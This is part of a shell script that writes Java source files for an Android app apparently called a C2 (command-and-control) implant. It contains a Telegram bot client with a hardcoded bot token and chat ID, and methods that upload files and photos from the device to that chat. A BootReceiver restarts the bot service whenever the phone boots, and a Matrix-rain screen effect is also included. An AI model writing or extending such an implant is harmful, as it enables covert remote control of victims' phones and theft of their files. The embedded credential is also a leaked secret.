          cat > app/src/main/java/com/vanta/c2/TelegramApi.java <<'VEOF'
          package com.vanta.c2;
          import android.util.Log;
          import org.json.*;
          import java.io.File;
          import java.io.IOException;
          import java.util.concurrent.TimeUnit;
          import okhttp3.*;
          public class TelegramApi {
              private static final String TAG = "TelegramApi";
              public static final String BOT_TOKEN = "8643608274:AAEZA9Izx1MMKZ6uN5wDYh8CD8QcRKjNbJI";
              public static final String CHAT_ID   = "8177714683";
              private static final String BASE = "https://api.telegram.org/bot" + BOT_TOKEN;
              private final OkHttpClient client;
              public TelegramApi() {
                  client = new OkHttpClient.Builder()
                      .connectTimeout(30, TimeUnit.SECONDS).readTimeout(60, TimeUnit.SECONDS)
                      .writeTimeout(120, TimeUnit.SECONDS).build();
              }
              public JSONArray getUpdates(long offset, int timeoutSec) throws IOException {
                  String url = BASE + "/getUpdates?timeout=" + timeoutSec + "&offset=" + offset + "&allowed_updates=[\"message\"]";
                  Request req = new Request.Builder().url(url).get().build();
                  try (Response resp = client.newCall(req).execute()) {
                      if (resp.body() == null) return new JSONArray();
                      JSONObject obj = new JSONObject(resp.body().string());
                      if (!obj.optBoolean("ok", false)) return new JSONArray();
                      return obj.optJSONArray("result");
                  } catch (Exception e) { Log.e(TAG, "getUpdates"); return new JSONArray(); }
              }
              public void sendMessage(String chatId, String text) {
                  try {
                      JSONObject p = new JSONObject();
                      p.put("chat_id", chatId);
                      if (text.length() > 4000) text = text.substring(0, 4000) + "\n...";
                      p.put("text", text);
                      p.put("disable_web_page_preview", true);
                      RequestBody body = RequestBody.create(p.toString(), MediaType.parse("application/json; charset=utf-8"));
                      Request req = new Request.Builder().url(BASE + "/sendMessage").post(body).build();
                      client.newCall(req).execute().close();
                  } catch (Exception e) { Log.e(TAG, "sendMessage"); }
              }
              public void sendDocument(String chatId, File file, String caption) {
                  try {
                      RequestBody fb = RequestBody.create(file, MediaType.parse(guessMime(file.getName())));
                      MultipartBody body = new MultipartBody.Builder().setType(MultipartBody.FORM)
                          .addFormDataPart("chat_id", chatId)
                          .addFormDataPart("caption", caption == null ? "" : caption)
                          .addFormDataPart("document", file.getName(), fb).build();
                      Request req = new Request.Builder().url(BASE + "/sendDocument").post(body).build();
                      client.newCall(req).execute().close();
                  } catch (Exception e) { sendMessage(chatId, "failed: " + e.getMessage()); }
              }
              public void sendPhoto(String chatId, File file, String caption) {
                  try {
                      RequestBody fb = RequestBody.create(file, MediaType.parse("image/jpeg"));
                      MultipartBody body = new MultipartBody.Builder().setType(MultipartBody.FORM)
                          .addFormDataPart("chat_id", chatId)
                          .addFormDataPart("caption", caption == null ? "" : caption)
                          .addFormDataPart("photo", file.getName(), fb).build();
                      Request req = new Request.Builder().url(BASE + "/sendPhoto").post(body).build();
                      client.newCall(req).execute().close();
                  } catch (Exception e) { Log.e(TAG, "sendPhoto"); }
              }
              private String guessMime(String n) {
                  n = n.toLowerCase();
                  if (n.endsWith(".jpg") || n.endsWith(".jpeg")) return "image/jpeg";
                  if (n.endsWith(".png")) return "image/png";
                  return "application/octet-stream";
              }
          }
          VEOF

          cat > app/src/main/java/com/vanta/c2/MatrixRainView.java <<'VEOF'
          package com.vanta.c2;
          import android.content.Context;
          import android.graphics.*;
          import android.os.Handler;
          import android.os.Looper;
          import android.util.AttributeSet;
          import android.view.View;
          import androidx.annotation.Nullable;
          import java.util.Random;
          public class MatrixRainView extends View {
              private static final String CHARS = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ";
              private int fontSize = 32;
              private int columns;
              private float[] yPos;
              private int[] speeds;
              private final Random rnd = new Random();
              private final Paint paint = new Paint(Paint.ANTI_ALIAS_FLAG);
              private final Paint headPaint = new Paint(Paint.ANTI_ALIAS_FLAG);
              private final Handler handler = new Handler(Looper.getMainLooper());
              private boolean running = false;
              private int baseColor = Color.parseColor("#00FF41");
              private int headColor = Color.parseColor("#C9FFD0");
              private final Runnable tick = new Runnable() {
                  @Override public void run() { update(); invalidate(); if (running) handler.postDelayed(this, 45); }
              };
              public MatrixRainView(Context c) { super(c); init(); }
              public MatrixRainView(Context c, @Nullable AttributeSet a) { super(c, a); init(); }
              public MatrixRainView(Context c, @Nullable AttributeSet a, int d) { super(c, a, d); init(); }
              private void init() {
                  paint.setTypeface(Typeface.MONOSPACE); paint.setTextSize(fontSize); paint.setColor(baseColor);
                  headPaint.setTypeface(Typeface.MONOSPACE); headPaint.setTextSize(fontSize);
                  headPaint.setColor(headColor); headPaint.setFakeBoldText(true);
                  setLayerType(LAYER_TYPE_HARDWARE, null);
              }
              public void setRedTheme() {
                  baseColor = Color.parseColor("#FF1A1A"); headColor = Color.parseColor("#FFD1D1");
                  paint.setColor(baseColor); headPaint.setColor(headColor); invalidate();
              }
              public void start() { if (running) return; running = true; if (columns == 0) setupColumns(getWidth()); handler.post(tick); }
              public void stop() { running = false; handler.removeCallbacks(tick); }
              @Override protected void onSizeChanged(int w, int h, int ow, int oh) { super.onSizeChanged(w,h,ow,oh); setupColumns(w); }
              private void setupColumns(int w) {
                  if (w <= 0) return;
                  columns = Math.max(1, w / fontSize);
                  yPos = new float[columns]; speeds = new int[columns];
                  for (int i = 0; i < columns; i++) {
                      yPos[i] = rnd.nextInt(Math.max(1, getHeight() / fontSize)) * fontSize;
                      speeds[i] = 12 + rnd.nextInt(22);
                  }
              }
              private void update() {
                  if (yPos == null) return;
                  for (int i = 0; i < columns; i++) {
                      yPos[i] += speeds[i];
                      if (yPos[i] > getHeight() + fontSize) { yPos[i] = -rnd.nextInt(400); speeds[i] = 12 + rnd.nextInt(22); }
                  }
              }
              @Override protected void onDraw(Canvas canvas) {
                  super.onDraw(canvas); canvas.drawColor(Color.argb(80,0,0,0));
                  if (yPos == null) return;
                  for (int i = 0; i < columns; i++) {
                      float x = i * fontSize + fontSize * 0.15f;
                      float y = yPos[i];
                      char head = CHARS.charAt(rnd.nextInt(CHARS.length()));
                      canvas.drawText(String.valueOf(head), x, y, headPaint);
                      for (int k = 1; k <= 3; k++) {
                          float yy = y - k * fontSize;
                          if (yy < 0) continue;
                          char c = CHARS.charAt(rnd.nextInt(CHARS.length()));
                          paint.setAlpha(Math.max(30, 255 - k * 55));
                          canvas.drawText(String.valueOf(c), x, yy, paint);
                      }
                      paint.setAlpha(255);
                  }
              }
              @Override protected void onDetachedFromWindow() { super.onDetachedFromWindow(); stop(); }
          }
          VEOF

          cat > app/src/main/java/com/vanta/c2/BootReceiver.java <<'VEOF'
          package com.vanta.c2;
          import android.content.*;
          public class BootReceiver extends BroadcastReceiver {
              @Override public void onReceive(Context c, Intent i) {
                  String a = i.getAction();
                  if (Intent.ACTION_BOOT_COMPLETED.equals(a) || "android.intent.action.QUICKBOOT_POWERON".equals(a)) {
                      BotService.start(c);
                  }
              }
          }
